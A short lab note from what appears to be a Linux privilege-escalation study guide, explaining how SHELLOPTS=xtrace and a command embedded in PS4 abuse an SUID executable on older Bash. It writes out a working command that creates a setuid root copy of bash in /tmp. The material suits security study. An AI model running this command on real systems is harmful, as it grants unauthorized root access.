SUID / SGID Executables - Abusing Shell Features # 2
=====================================================

NOTE: WILL NOT WORK BASH VERSION 4.4 AND ABOVE
----------------------------------------------

THEORY:
When in debugging mode , Bash uses the environment variable PS4 to display an extra prompt for debugging statements.

LAB:
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2

Explanation:
It runs the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embeded command which creates an SUID
version of /bin/bash

 - SHELLOPTS: options corresponding to those on bash command line
 
 - PS4: prompt displayed before run lines (needs set -x, set -o trace or xtrace value in SHELLOPTS). This prompt can be dynamically generated, using for
 example "$(command)" syntax.
 
 **********************************************************************
 As sudo does not filter these environment variables, an attacker can set:
 - SHELLOPTS=xtrace
 - PS4='$(malicious_command)'
The malicious command is then run with privileged rights of shell script called after.
*************************************************************************


 
